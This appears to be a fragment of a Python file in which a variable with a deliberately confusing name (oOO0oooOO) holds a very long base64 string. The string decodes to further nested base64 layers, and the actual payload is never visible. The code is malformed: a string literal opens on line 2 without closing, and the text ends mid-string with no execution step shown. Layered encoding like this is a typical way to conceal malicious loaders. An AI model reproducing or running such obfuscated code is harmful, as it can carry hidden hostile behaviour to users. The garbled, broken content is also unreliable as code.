import base64
oOO0oooOO = "import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwV1ZaamVHUXlTWHBUYWtKS1VqQndiMWw2U2xaTmF6VkNZMGhhVlUxRWFETlpha2sxWkd4UmQwOUhaRkZWTUVad1ZHNXdhMDFWZDNkaVJGWlNZV3R3YjFadWNFSk5iR1J6WVVjNWEwMVhlRmxVYkdRd1lURkpkMWR1UWxWTmFsWlFXa1ZhYzFkV1RuRlJiV2hYWld4YWVWWXllR3BOVlRGR1QxaFdWbUpYYUdGWmJYTXdaREZzY1ZSclNsQldWRlpHV1RCb2QyRlZNWE5pTTJSaFVsZFNTRmxXWkU1bGJGWjFWMjF3VTFKRlJqTldSRWt4VkRKSmVWSnNhRmhoYTBweVZGY3hOR05zY0VaYVJ6VlFWbFJXUmxscVFqQlRiVlpXVW1wQ1ZFMXRkRE5YYWtaeVpWVTVXR1JIYUZkbGJGb3hWa1JLYzFFd01WaFZhMmhZVjBaS1VWVlVRa2ROUmsxNVlUTmtWRTFIZHpGVVZXaFRWRlpXTmxGcVFsVlNhekV6V2tWV05GWkZNVWxWYXpGV1pXdEpkMVpGV2s1a01sSkdaVVpTVGxOR1NrNVdXSEJEVFVaU1IxUllaR3RTV0doVlZGVm9VMVJXVmpaUmFrSlZVbXN4TTFwRlZqUldSVEZKVldzeFZtVnJTWGRXUlZwT1pESlNSbVZHVWs1VFJrcE9WbGh3UTAxR1VrZFVXR1JyVWxob1ZWUlZhRk5VVmxZMlVXcENWVkpyTVROYVJWWTBWa1V4U1ZWck1WWmxhMGwzVmtWYVRtUXlVa1psUmxKT1UwWktUbFpZY0VOTlJsSkhWRmhrYTFKWWFGVlVWV2hUVkZaV05sRnFRbFZTYXpFelZYcEdkMlJXVG5WWGJXeFdUVVZ2ZVZkVVFtdFdNbEpYWTBac1ZHSnRVa3RWYWtvMFRVWnJkMWw2Vm14V01VcEZWVmN4YjJGc1NYbGtTSEJVVmxkU2FGa3dXbmRYUjFaSVpFZHdiRmRIVW5WWFYzaHFUbGRGZUdOR2FHeFRTRUpPVlZSQ1MySldSWGxOVjBac1ZqQnNOVlJWWkd0WlZrbDNWMWhrV0dKSGFGUlpNR1JMVjBaYVdGcEhhRmRsYTFsNlYxZHdUMU13TVVaaVJXaFdZbGRvY2xWcVJscGtNV3hYV1ROb2FWSllhRWxXVnpGdllURkplRlpyZUZoaVZGWk1Xa2N4UzFaR1JuVlhiWEJUVFZadmVGWXllRzlUTWxGM1pVaFNWMkZzU21GVVYzaGhUVEZ3UmxwSVRtdGlWWEF4Vmtaa2EyRkdXalpTYWs1YVlXczFURlJWVm5OU01XUjBZVWRzVTAxdWFIbFdNVnB2VlRKT1NGTlliRTlXVm5CeFdXMTBkMDFzYTNsaVJGSlhZbFV4TlZadE5YTlZNV1JHWTBSV1dtRnJOVXRWZWtKUFpFWlNkVlJzY0ZoU1ZGVXlWVEZXYTFNd01WaFVXSEJUWVd0YVdsUlhlRXRqTVdSMFRsWmthMVp0ZERWWmEyaGhZVmRHV0dGRVFscGhhM0JVV1d0a1MxTldVbGxXYkZaWFpXMTRlVll5ZUd0Tk1rNUdUMWMxYVUxdFVrdFZWRUpIWW14a1JWTlVSbWhTTUhCWlZteGthMVZXVlhkU2JsWllWbnBXV0ZwWE1VOVhWbHAwVjIxR1UwMVdjREJYYTFwcVRWZEdkRkpzYUZCWFJscE1Xa1JKTldKc1RsWlVhMHBoVFZka05WWlhNVFJoYXpGeVRsUldXbFp0YUVSVVZXUkhWMFU1V1ZacmNGTlNSVXAxVjJ0YVQxTXhSWHBaZWs1cVUwaENjVll3V21Gak1XUnlXa1ZhWVUxWVFrbFdiR1JyV1ZaSmVGZHVVbUZTYlUxNFdWY3hSMkZzVVhwalIyeG9WbGQ0VFZVeFZrOVJiRzkzWWtWa1VGZEhlR2hXYWtFeFlsWnNkRTFWWkd0U2JrSlZWVlpTYzFOc1JYbFZha1phWVd0c05GbFdaRTlrUmxwWVRsVlNhRlpWV25WVk1WWlBVVEpGZUdOR2FGaFdNbEpvVm01d1ZtVldiRmRhUldSc1ZtMWtObFpITldGaFZrbDVaVWhHV2xadGFGUlVWbHAzVWtkR1NXTkhSbGROTW1nd1ZrVldUMUV5Um5SVWJrSnJUVzFTY2xacVNqUmpiRkpHVkd0T2FsSnVRa3BXUm1oUFUyeEpkMDVVU2xwaVZGWlVXV3RrVjFOV1ZsVmlSbFpwVmtkM2VGWXllRTlqYXpWeVZHNUNVbFl5VWt0VlZFSkhZbXhPVmxSclNtRk5helV3Vm0wd01WTnNTa1ZSYlRWYVpXdHdXRmw2Um5kalJUVllZa2R3YVZaSGREWlhXSEJMVm0xSmVHRXpjRlJYUlRWTFZUQmFZV1F4WkhKVWFrNWhUV3RhV1ZaWE5YZFVWa1YzVTI1R1dtRnJhM2hVVlZwM1YxZEdSVkZzUmxkTlJGVjVWMWN3TVZVeVNraFdhMnhXVjBWS1dWcFhkRXRoTVVWNVlrVktZVTFIZUVWVlZtUnJVMnhGZDFKdE5WaFdla0V4V1ZSS1YxWkdSbFZpUlhCU1RXczFNVlZVU25OUmJHOTNZa1ZTVWxZeVVrdFZWRUpIWW14a1dFMUVWbWhOYkZwVlZWWm9TMVZXVlhkU2JrSmFaV3RyTVZsNlNrZFhSbEoxVVcxMFZGSnNjSGxXUkVwelZqSldjbVZGVWxSV01sSk1WbFJDUjJSc2EzbE5WbVJwWVROb01GbHJaREJVUmxaWVQxYzFWRlpWTlVOWGFrSnpVa1pHV0ZwRmNGTk5TRUY1VmpKMGIyTnNiM2RrUkZwT1VqSlNTMWx0ZUV0TmJHeHpXWHBTVDJFelFscFdSbWhQVTIxR1ZsSnVUbFJXVlRWMldsWmFkMWRHYTNwV2JYUlRaVzEzZDFkWE5YTmpiRTEzWWtWU1VsWXlVa3RWVkVKSFlteE9WbFJyVG1oV01HdzFWbGR3VjFOc1JYcFVWRlpVVmxVMVRGbHNaRXBsVjFaSlVXMXNiR0pVYkhwWFZFNXpUVEpHVm1KRlVsZFdNbEpOVlRCV2QyTXhaSFZoZWtacFZqQnNOVnBWYUVOaFYxWllaRVY0VkZaVk5VTlhha0p6VWtaR1dGcEZjRkpOUlhCM1YxZHdTMVV3TlZaaVJWSnFaVzE0UzFWVVFuZE5WbkJIV1ROb2FWSXdOVEJVTUZKaFV6RmtSazFZY0ZSV01uaERXV3RXYzFKSFJrbGlSMFpYVFdzMGVGZFhNREZXTWxKSFkwWnNWR0pzY0UxV1ZtTTFZbXhPVmxSclNtRk5SM2hGVlZaa2ExTnNTWGRqUkVwWVlUSm9lVmRxUWpCT2F6RklXa1Z3YVZaR1dYbFhWM2hyVXpKV1YyTkdWbWxOYm1oeFdsWm9hMk5HVGxaVWJGcGhUVWhTU2xVeU1UUlpWMVpWVm1wR1dtRnJiRFJaVm1SUFpFWmFXVkZyVW1oV1ZWcDFWVEZXVDFGc2IzZGlSVkpTVmpKU1lWbHNVbk5qYkhCWFZHdEthbUpGU2xWVlZtUnpWMnhrUmxOdVRscGhNbEV3V1RCYWQxTkZPVWxoUmtKb1ZteHZNbFpGVms5VGJHOTNZMFpTVWxaNmJIRlpiRnBoWkZaU1NFMVZaR3ROV0VKWldsVm9UMkZHV1hoVGFrcFZWbXMxZVZWNlFuTlNSa1pZV2tWd1VrMUZXblZWTVZaUFVUSkdXRk5ZYkZaaGJGcExWVlJPVGs1V1RsWlVhM1JvVWpBMVNWWnROVTloVmtsNVpVaEtXbUp1UWt0VWJYUjNWMVpTV1ZScmNHaFdWVnA2VlRGV1QySXlWbGRqUm1oYVRURmFZVll3Vmt0ak1XeHlXa1JTYWxKdVFrbFVNR2h6VkVaV1dFOVhOVlJXVlRWRFYycENjMUpHUmxoYVJYQlRUVWhCZVZZeWRHOWpiRzkzWkVSYVRsSXlVa3RaYkZwM1l6RmtWVk50T1doU2JXUTFWR3hrYjFkdFZuUlBXRTVhVFRKM2VsbFdWbk5TUmxwWVdrVjRWRkpVVWpOWFZFcHpZakpXVjJOR2FGcE5NVnBvV1d4YVlXTldiRlphUldSaFlsVndNRlZ0TVhkVVJsVjVaRVY0VkZaVk5VTlhha0p6VWtaR1dGcEZjRkpOUlhCM1YxZHdTMVV3TlZaaVJWSnFaVzE0UzFWVVFuZGxiSEJIV2tkMGFGSXdOWHBVTVdoWFYyeFpkMDFFU2xSaVIyaFBXWHBDYzJOR1JsaGxSWEJTVFcxbk1WWXllR3RoYlZKWVUydHNWMkpVVm1GV01GWjNZbFpzZEUxVlpHaGhNMUpUV1dwS2ExTnNSWGRTYlRWVVZsVTFRMWRxUW5OVFJURllZVWRvVjAweWFIUlhWM0JMVXpKT1ZtSkZWazVTTWxKeFZGZDRZV1ZzWkhSaGVrWnJUV3RzTlZReGFFOVVWMHBZVlc1T1lWSlZOWFZaYlRGTFYwWktkVkZ0YkZKbGJGbDNWako0YjFReVZuTmlSbWhoVWpOb1RGcFdaREJVUms1V1ZHdEtZVTFIZUVWVlZtUnJVMnhGZDFOcVNscE5SMUpRVjIxNGNtVlZPVmxXYlVacFVrZDNlVll4WTNoa2JHOTRVV3hTVW1KdVFtaFdhazV2WkVaU1NFNVZUbXRpVld3MVdrUk9WMWxWTVhOWFdHUlVUVVUxY2xwSE1VOVRSbEoxVVcxc1RtRnNXbnBYV0hCR1RsZEdkRk5ZYkU5V2VrWk1XbFprTUZSR1RsWlVhMHBoVFVkNFJWVldaR3RUYkVWM1UyNUdXbUZyTlV4YVZscDNWakE1V0dOSGJFNWhiRm93VmpCU1NrNVhSbGhTYmtKU1ZrZDRTMVV3VlRGak1XeHlXa1p3YTFZd05VbFVNV2hoWVZaR05sWnVWbGhpUjJoVFdXcENkbVZzVW5SaFJuQk9UVWhDZGxZd1VrdFVNbEowVkc1V1ZHSllhSEJVVmxKelkxWnNjVk5VUm1sV01GcFpWMVJKTVZSR1ZsaFBWelZVVmxVMVExZHFRbk5TUmtaWVdrVndVMlZ0ZDNwV01WSkdUbGRHZEZOWWJFOVdla1phVkZjeE5HTnNhM3BpUlVwUVZsZDRTVlF4YUd0WGF6RlZZa2hHV21GcmEzaFpiRnB1WlZVNVdHSkhhR2hXUmxreVZqSjRhMUl5VmxkaE0yeGhUV3BzWVZSVVFuTmxiRTVXWVVaa2FsSnVRa1ZhUkVwclYwVXhWVkZ1Y0ZSV1YxSlFXa2N4UzJSV1ZuUmxSM2hVVW10Vk1WWXhVa3BPVjFKWVZXdG9WMkZzU25KVlZFb3dWRVpPVmxSclNtRk5SM2hGVlZaa2ExTnNSWGRUYWtwYVRVZFNVRmR0ZUhKbFZUbFpWbTFHYUZaVlZURlZNVlpxVGxkUmVHRXphRkJXTTBKd1ZGZHdWMlJHWkVWVFZGWm9WakJhZDFSc1pITmhiVXBWWVROd1dtVnJjRmRaYWtaeVpXeE9XVlJyY0ZSU2JIQXpWakowVDA1SFVuUlVhMmhWWWxad1lWUlhjSE5OVm1SMFpIcFdhbEp1UWtwV1JtaFBWMnN4Y1dKRVJtRlNWMUpZVkd0a1UxSlZNVmhqUjJ4T1lXeFdNMVl5ZUc5aU1ERkdaRVprYWsweVVscFdWRUpMWkRGa2RHSkZUbXRpVlRWSlZrY3hZVmRyTVhGaVJFWllZbGhqTVZrd1duZFRWbEpZV2tkR1YwMHlaekpXTW5oUFVURlJlVk5ZYkU5V00yaEZXVlpXUjJKc1RsWlVhMHBoVFVkNFJWVldaR3RTUjBaV1VtMDFWRlpWTlVOWGFrSnpVa1pHV0ZwR2NFNWhiWGN4VjFSSmVGWXlVbk5hTTJ4cFVqTlNjVnBXVmtaT1ZrNVdXa1U1YTJKVk5URlZNakUwVjFVeGNrNVVTbHBpVkVab1YyMHhTbVZXVG5WU2F6RnBZWHBXZWxZeFdtOVRNa1owVW10U2FGSXpRbkZaVm1ocllteHdSMXBJVG1oTlNHaEZWVmN4UzFSR1JYbFZhbFpZWWtkU1NGbDZTa2RYVjA1SVYyMXdUbUZ0ZURaWFZscHJWRzFLY21WRlVscGxiWGhNV2xab2IxWnNhM2xPVm1ScFVsaFNXRlJWYUU5VGJFbDNUbFJLV21KVVZsUlphMlJYVTFaV1ZXSkdjRTVoYlhkNFYydFdhMVl3TlVoVmExSm9UVWhTUzFWVVFrZGliRTVXVkd0S1lVMUhlRVZWVnpFMFlWWlpkMWR1WkZwaE1Xc3hWRlZrUzA1V1JsVmlSWEJTVFdzMU1WVlVTbk5SYkc5M1lrVlNVbFl5VWt0VlZFSkhZbXhrYzFremFHaFNNRnBaV2xWa1lWZHJNWEpOVnpWV1VtczFRMWx0ZEhkTk1rbDVXa1Z3VWsxRlduVlZNVlpQVVd4dmQySkZhR2xTZWtaTFZXcEJNVTFzYTNsT1ZYUnBVakJzTkZReGFFTlpWazVHVFVSS1VrMXRlRU5YYWtKelVrWkdXRnBGY0ZKTlJWcDFWVEZXVDFGc2IzZGlSV2hWWW14d2NWbHRkSGRqTVd4eFVsUldhMkpIZURCWk1HaDNVMnhLUlZGdE5WaFdSV3N4V2xaa1QyUkdXblJYYkhCT1lXMTNlRll5TVROT1YxSnpZa2hTYVUweFdtRlpiWFIzVFd4d1JWUnJPV2xTV0ZKSlZrYzFjMVJXUlhkVFdHaGFWbTFTVTFsNlFuTlRSbEoxVjIxd2FXRXpRbnBYVjNCR1RsZE9SMk5GYkZWWFJUVkxWV3BCTVUxc2JIUk9WazVwVWpGYVNsWldVbk5YYXpGeFlrUkdZVkpYVWxoVWEyUlRVa2RGZDJSRmNGSk5SVnAxVlRGV1QxRnNiM2RpUlZKU1ZqSlNTMVZVUWtkaWJHUnpXVE5vYUZJd1dsbGFWV1JoWVRGS05tRkhOVlpTYXpWRVdWY3hTbVZzVG5WaVIwWlhaVzE0ZEZkWGNFdFRNazVZVkZob2FrMHlVbHBXV0hCWFkxWnNjVlJyZEd4V2JrSlpWREJXTUZOc1JYZFNiVFZVVmxVMVExZHFRbk5TUmtaWVdrVndVazFGV25WWFZscHJWMnh2ZVZOcmFGZGliRnBOVldwQk1VMXNhM2xPVlhScFVqQnNORlF4YUdGWGJVcFpVV3BhVkUxVk5VTlRla0p6VWxaS1ZWZHJVbWhXVlZwMVZURldUMUZzYjNkaVJWSlNWakpTUzFWVVFrZGliRTVXVkd0S1lVMUhlRVZWVnpGM1lWVXdkMk5FVmxoaVIwMHhWMjB4U21WV1RuVlNiWEJzVmtaWmVsZFhjRTlSYlVsM1RWVlNhRTFJVWt0VlZFSkhZbXhPVmxSclNtRk5SM2hGVlZaa2ExTnNSWGRTYlRWVVZsVTFRMWRxUW5OVFIxWkpVVzF3VGsxVmNIWldNRkpMVkRKU2RGUnVWbFJpV0dod1dsWldSazVXVGxaWGFrSm9ZbFZ2TVZSc1pIZGhWVEIzWTBSV1dHSkhUVEJYYWtaM1pFVTVXV0pGY0ZOTlJGVjVWVEZXYTJNeVVsWmlSV2hWWW14d2NWbHRkSGRqTVd4eFVsUldhMkpIZURCWk1HaDNWMVpXV0U5WE5WUldWVFZEVjJwQ2MxSkdSbGhhUlhCU1RVVmFkVlV4Vms5UmJHOTNZa1ZTVWxZeVVtaFdibkJIWWpGc1YxcEVVbUZpUjNRMVZrWmthMVZXVlhkU2JsWlZVbFUxY1ZwR1pFZGtSVGxaVVcxc2FGWXlhRFpYVmxwdlZEQXhSMkpHWkZCV00wSndWRlJDZDA1V1pITlplbEpxVWxVMWQxVldaR3RUYkVWM1VtMDFWRlpWTlVOWGFrcExWMVpTZEU1V2JFNU5XRUoyVjFkMGIxUnNiM2hSYkZKU1lXMVNSVmxXVmtkaWJFNVdWR3RLWVUxSGVFVlZWbVJyVTJ4RmQxSnROVlJXVlRWeVdsY3hVMWRHVG5WU2JVWlhUVVJTTTFVeU5YZGtiRzkzWWpOa1ZHRnJXbkZVVjNNeFlqRnJlV0pGVG1oTldFSlpWakp3UjJGWFNsWk9XR1JhWVd0cmQxbHRkRFJSYlVsNVdrVndVazFGV25WVk1WWlBVV3h2ZDJKRlVsSldNbEpMVlZSQ1IyUldaSEphUldST1VtNUNWVmRZY0dGVGJFbDRVMjA1WVZKWFVsaFVWV1JIVjBVeFdHVkZNV2xXUmxsNVYydG9jMkp0VGtabFNGWlZZV3RLY1Zsc1duWmtNV3hYV1ROb2FWSllVa1ZYVkVvMFYwWldObEZ1VGxwaVJURXpXV3RhZDFKR2EzcFJhekZTVm5wc2RWVXhWazlSYkc5M1lrVlNVbFl5VWt0VlZFSkhZbXhPVmxSclNtbGlWa3BhVmtjeE5HRnRTa1ZpU0dSWVlUQTFjVlJ0ZEhOVFZscDFVVzFHVWsweVVrMVZNVlpQVVd4dmQySkZVbEpXTWxKTFZWUkNSMkpzVGxaVWEwcGhUVWM1TlZSV2FHRlpWa2w0VjI1d1ZHSnVRakpYYWtKMlpWWk9jVkp0Y0U1TlJtdzBWakJTUzFVeVNrZGpTRlpYWW14YVlWUlhNVFJOYkd4MFlrZHdhazFGTlhkVlZtUnJVMnhGZDFKdE5WUldWVFZEVjJwQ2MxSkdSbGhhUlhCU1RXeEpNVll5ZUc5VU1YQjBVbXhvVmxaNlZsRlpWbFpMVGxaa2MxcEhjR3BOUlRWM1ZWWmthMU5zUlhkU2JUVlVWbFUxUTFkcVFuTlNSa1pZV2tWd1VrMXNTbmRYVjNCTFZUQTFWMW96Y0ZaaVdHaHpWVEJhUjJSV1VYbGlSVTVvVmpCc05WWlhjRmRVVmtaWVQxYzFWRlpWTlVOWGFrSnpVa1pHV0ZwRmNGSk5SVnAxVlRGV1QxRnRTbk5qUm1oT1ZqSm9iMVpxVG05aVZtUjBUbFYwYTJKVmNGVlhXSEJoVTJ4S05tSkVUbGhXUlZVeFdWY3hTbVZWTlZoTlZURnBWbFJWZVZkVVNURlRNa3BJVTFob1VGZEhlR2hXYm5CSFpERndSbFJyVG1wU2JrSjNWVmMxWVdGc1NYZE9WekZZVmtWck1WcEdXbmRqUmtaMFpVZHNWRkpVVm5wVk1WWlBZVzFLY21WRlNtbE5iVkpMVlZSQ1IySnNUbFpVYTBwaFRVZDRSVlZXWkd0VGJFVjNVbTVXV0dKSFRqUlpWV1JIVjBkV1NGZHRkRk5sYldneFZrUktjMUV5U2toVGJHaFRZbXRLY0ZWdGNISmtNV3gxWWtST1ZFMUhlRVZWVm1SclUyeEZkMUp0TlZSV1ZUVkRWMnBDYzFKR1JsaGFSWFJPWWtadmQxWXhXbXRqTWsxNFdqTnNWV0pZUWt4YVZ6QTFZbXhrYzFremFHaFNNRnBaV2xWa1lWZHJNWEpOV0hCU1RXMTRRMWRxUW5OU1JrWllXa1Z3VWsxRlduVlZNVlpQVVd4dmQySkZVbUZTTTJod1ZtcENZV1F4YkhKWFZGWm9WbTEwTlZaR1l6RlZSMFpZVkc1V1ZWSlZXakpYYWtKelVrWkdXRnBGY0ZKTlJWcDFWVEZXVDFGc2IzZGlSVkpTVm5wV2NWbHNXbUZOTVd4eVlVaE9ZV0pXU2tsVU1HTXhWVWRHVmxKdVZsUmliWGQ2VlhwQ2MxSkdSbGhhUlhCU1RVVmFkVlV4Vms5UmJHOTNZa1ZTVWxZeVVreFVWM0JIWXpGc05sUnJPV2hTYlRrMVZtMHhZV0ZHV1hoU2JsWlZUVzE0UkZaRVNrcGxWVFZZWlVVeFVsWjZiSFZWTVZaUFVXeHZkMkpGVWxKV01sSkxWVlJDUjJKc1RsWlVhMHBwWWxVMU1GWnRNSGhaVm1SR1kwaE9XbUpVUmxCWmEyUlBUbFpzTmxkcmNGTldSbGw1VjFjd2VGWnRUWGRVYmtKU1ZqSlNTMVZVUWtkaWJFNVdWR3RLWVUxSGVFVlZWbVJyVTJ4RmVWVnFXbUZTYlZKTVZGVmtWMWRXUm5SbFJYUnNZbFJzZFZVeWNFOVJNazE0WWtab2FWTkdXa3hhVm1oclZFWk9WbFJyU21GTlIzaEZWVlprYTFOc1JYZFNiVFZVVmxVMVExZHFRblpsVjBaSVpVWndWMDFWY0hwWFZFa3hWRzFLY2s5WVFsSmhlbXh3VkZkd1YyTXhVa1pTYmxwaFRVZDRSVlZXWkd0VGJFVjNVbTAxVkZaVk5VTlhha0p6VWtaR1dFNVhiRmROUm5BelYxZDBXazVYVm5OalJteFVZV3R3YUZZd1ZuZGlWbXhYV2taS2FXRjZiSGRWVjNNMVlWVXhjVlp1VGxWU1ZWb3lWMnBDYzFKR1JsaGFSWEJTVFVWYWRWVXhWazlSYkc5M1lrVlNVbFo2Vm5GVVZFWkxZakZ3UmxwR1dtbGhlbXgzVlZaak1XRlZNSGhYV0dSWVlXdHJNVmt3WkV0a1JtdDVUbFV4VWxaNmJIVlZNVlpQVVd4dmQySkZVbEpXTWxKTFZWUkNSMkpzVGxaVWEwcHBZa2Q0V2xadGNFTmhWVEZWWWtoS1dHSkhVVEJaYTJSVFUwWmFXRTVXUW1oV1ZYQkpWakZhYTA1SFZuTmpSa3BwVFcxU1MxVlVRa2RpYkU1V1ZHdEtZVTFIZUVwVVZWWXdVMnhGZDFKdE5WUldWVFZEVjJwQ2MxSkdSblZWYkhCWFRXNW9ObFl3VWt0ak1rVjNZa1ZXVGxJeVVuQldha0poWkRGc2NsZFVWbXRpUjNnd1dXcE9WMWRyTUhkalNFNVlWbTFvVkZsclZqQlRSbEoxWWtVeFVrMUZiRFJYVmxwclZXMU5kMkpGYUU1WFNFSm9WRlpTY21WV1pGZGFSRkpzWVROb1JWVlhNWGRoVlRGeFZsaGtXR0pIYUhaVVZWWXdWVzFKZVZwRmNGSk5SVnAxVlRGV1QxRnNiM2RpUld4VVlsaG9jVlJVUWtkaWJGWkhWR3RPYTFKdGVGbFphMmhQVjFVeGNXSklRbHBXTW5ONFdsZDRkMWRGTlZoa1JYaFRUVVJWTVZaRlZrOVJNREZZVW14b1ZsZEZOVXRWYlRWVFRVWmtWMXBJVG1wTlYyUTFXV3RrTUZkV1ZYcGFSelZYWVRKb1RGUldXbmRXUjFaSVkwZHNUbUZzVmpOV01uaHZZakF4Um1SR1NtbE5iVkpMVlZSQ1IySnNUbFpVYTBwaFRVZDRTbFV5TVRSaE1VNUhWMnBXV21KWGVFTlpha3BPWlZaYWRWUnRSbWhXUmxZMlYxUkplR013TVVkalJsSm9Vak5DY1ZsV2FHdGliSEJIV2toT2FFMUlhRVZWVnpWRFdWWk9SazFZY0ZSV1YyZzJXVzB4VG1Wc1ZuUmhSM1JUVFZaYU1WWkVTbk5SYlVwelUyeG9UMVpGY0c5V2FrSmhZMnhzZFdKSGRGQldXR2hGVlZjeGQyRlZNWEZXV0dSWVlrZG9kbFJWV2tOWFJsSjFWMjFzYVdKRmNIcFhiRlp2VlcxT1JtSkZhR2xTZWtaTFZUQldkMk14YkRaVWEwcGhUVmhDV1ZwVmFIZFpWbFYzVTJ4YVdrMXFWbGhaYTFZd1ZXMUplVnBGY0ZKTlJWcDFWVlJLYzFGc2IzZGlSVkpTWWxSR2FGWnFRVEZrYkdSWFYxUldhMDFZUWxwV1ZsSnpVMnhKZUdOSVpGaGlSMUV3V1ZSS1QwNVZOVlpXYkhCWVVtdHdlbFY2UW05V2JVcHpVMjVTVjJKWVFtOVZha0pYWW14a2NscEdXbUZOYTNCSlZXeGthMkZzU1hoWFdHUmFWbTFTVUZrd2FHcE5NVkoxVm10MGJGZEhVblZYVkVsNFZqSldTRlZzYUdsVFIzaG9WbXBHUms1V1ZuUk5WV1JxVFdzeE5WWnNhRTlUYkVsNFUyNU9XR0pVUmtoVVZtUkxVMVpXVldKSFJtbFdNMmg2VjFkMGExVXlWbkpsU0VwV1lsZG9jbFZxUmxkTlZtUlZVMVJXYTFZeFNrbFdiWEJUWVRGS2NXRXpaRnBoYTNCVVdWVmtWMVpIUlhka1JYQlNUVVZhZFZVeFZtOVZNbEowVTJ4b1VGSkhlRXRWYWtaM1pERmtjMXBFVW1oTmF6UXhWR3hXVTJGR1NYZFhhbFpVVFVkb1YxbHRlR0ZUUlRsWlZXMXNiRll3TlRaVk1WWnZVekpLU0ZSc2JGZGlhMHB4V1d4YVlXTnNWa2RXYlVab1VqQndTbFpITVRSVVZrVjNVMnBhV2xadGFETlphMXBEVmxadmVscEZlRlpXZW14MVZURldUMUZzYjNoalNGSlFWMFUxYjFadWNHNU9WazVXV2tkR2FsSnVRbGxhVldRd1lXMVdWVlpyVmxwV1YxSklXbFpXTUZOV1dsaE9WazVwVmtkNE5sZFdXbXBPUjBweVpVVlNVbUp0ZUdoV01GWmFaVVpzVjJGRmRHbFNia0pHVkZaV2ExZHNXWHBoUkZwWVlrVTBlbGRxU2s1bFYwcEZWMjFHVjFKRlNUSldSbFpQWTJ4TmQySkZVbEpXTWxKTFZXNXdWbVZHYkhOYVJtUnNWakJ2TWxSVlpHdFpWMHBZWlVoT1dtRXlVbFJhVjNRMFkyeFNkRTlXY0ZoU1YzZ3lWMnRhVDJFeFVYcFplazVxVTBaS2FGWXdWbmROYkU1MVlrUk9ZVTFyTlRCV2JUVnZZVEZaZVdWRVZsaGlSMUpUVkRGYVMyUkdTblZVYlhCT1lrWmFObFV4Vm05VU1rNUlWbTVTVjFaSGVFOWFWM1JIWkRGRmVXSkZTbUZOUjNoRlZWYzFWMkZWTVhGU2JrSmFUV3BHVjFReFZuTlRSbVIxVVcxR1YwMHlhSGxYVkU1eVRWWktTRkpyYUZOaWJYaE5WVEJhVjJSV1draE5SRlpyVW0xNE1WVXlNVFJVUms1R1RWaGtWR0p0ZDNwWGFrcFBaRVphZFdGSGRGZE5ibWN4VmpKNGExVnJPVmRUYmxKVFltczFjVlJYZUZkbGJFNVdZVVU1YWxJeFdqQldiRkp6VkRGYVJsSnVaRkpOYlhoRFYycENjMUpHUm5SaFIzQlRUVlp3TmxkWGRHdGpNa1Y1VTJwYVUxWkhlRXRWYWtaM1pERmtjMXBFVW1oTmF6UXhWR3hXVTJGR1NYZFhhbFpVVFVkb1YxbHRjM2hYUmxwMVlrVndVMDFHYjNwV01uaHJUa2ROZVZKc2FGWmliSEJNV2xab2EySnNhM2xOVm1Sc1VqRktXVmxyYUhOWlZsbDRVbFJXVm1KVVJraFpla3BPWlZaYVdWUnJjRlJTVkZZelYyeGplRlpyT1ZaTlZGcFVWMFZLUlZsV1ZrZGliRTVXVkd0T2FGSXdOVWxXYlRWUFlWWkplV1ZJU2xwaWJrSkxWREZXYzFOR1pIVlJiVVpYVFRKb2VWZFVUbkpOVmtwSVVtdG9VMkp0ZUUxVk1GcFhaRlpTV0UxV1RtdGhNbmhKVlcwMWExbFdXWHBoU0hCYVZtMVNWRnBIZEhkT1YxRjVXa2R3YVZac2J6QlhhMXByWXpKV1YyTkdhRlpXUjNoVVdXeFdZV1ZzYkRaVGJGcHFUVWQ0U2xaSE5VTmlSMHBYVmxSV1ZWZElRa3RaTUZaUFkwWkdXRnBGY0ZKTlJYQXdWako0YTFReVNYaGlSbVJRVjBaYVlWWnFRWGRPVms1V1drZEdhbEp1UWxsYVZXUXdZVzFXVlZacldsaFdiV2hVV1d0V01GTldXbGhPVms1cFZteHdlRmRXVm10U2JHOTRZMFZvVjFZeVVuQlpiRlpoWTFac1Yxa3phR3BTYmtKWlZHeFNRMkZYVmxoVWJuQlVWbGRvVEZsclpFOVhWbHAxVVcxd2FWWnNjSGxXVlZwWFdWZEdTRk5yYkZWaVdHaE5WbFpqTldKc1RsWlVhMHBoVFd0d1NsWnRNREZYYkdSR1kwY3hXbUpVUmtoWlYzaERWa1pHZEUxWGFGZE5WbkEyVmpKMGIxUnRVbGRTV0d4b1VqSm9jVmxXWkc1bFJrNXhVV3BTVGxadE9UVlZiVFZ6VTJ4SmVGTnVUbFJXVjAxNFdWVmFjbVZYU2tsVmJXaFhUVlp2ZUZkclZtcE9SMHB5WlVWU1VtSnRlR2hXTUZaYVpVWnNWMkZGZEdsU2JrSkdWRlpXYTFkc1dYcGhSRnBZWWtVMGVsZHFTazVsVjBwRlYyMUdWMUpGUmpWV1IzUlBZMnhOZDJKRlVsSldNbEpMVlRCVk1HUXhaRmRoUms1cFVtdEtWVlZYTUhoaFJsbDRWMjV3V0dFeWFFOWFSbHBXWlZaYWRWUnRSbGROUkZJelYxWmFhazVYVWxaa1JXUnFUV3BzVEZSVlZURk9WbVJ6V2tWa2FFMXJiekZYVkU1UFUyeEZlVlZyVmxwTmFrWllXVlZhZDFORk9VaE9WWGhXVFRKU01sVXljRU5XTWxKWVZXNVNhVkl5YUdoVmJuQnZaRlpTUmxSclNtbGlSWEJaVkd4U1MyRkdXWGRYYmtwYVltMTRjVmt3VmpSU01ERkpWR3R3VWsxc1NraFhXSEJQVlRKR1IyTkZhRkJTZWxaT1ZWUkNTMDVzYkZkaFNHUnBVbXRLVmxWc1VrdFVWa1YzVTJwV1dHSkhVa2haVkVwS1pWVTFXVlJ0ZUZkU1JWcFhWMVJKTVZZeVNrWmxSVkpTWWxoU2FGWnFSbmRpTVhCSFdrUlNUbEpyU2xWWGExWlRZVzFLVjFkdE9WaGhNazB3V1cxME1GWkhVWGRrUlZKb1ZsUkZkMVpGV2s1a01sSkdaVVpTVGxOR1NrNVdXSEJEVFVaU1IxUllaR3RTV0doVlZGVm9VMVJXVmpaUmFrSlZVbXN4TTFwRlZqUldSVEZKVldzeFZtVnJTWGRXUlZwT1pESlNSbVZHVWs1VFJrcE9WbGh3UTAxR1VrZFVXR1JyVWxob1ZWUlZhRk5VVmxZMlVXcENWVkpyTVROYVJWWTBWa1V4U1ZWck1WWmxhMGwzVmtWYVRtUXlVa1psUmxKT1UwWktUbFpZY0VOTlJsSkhWRmhrYTFKWWFGVlVWV2hUVkZaV05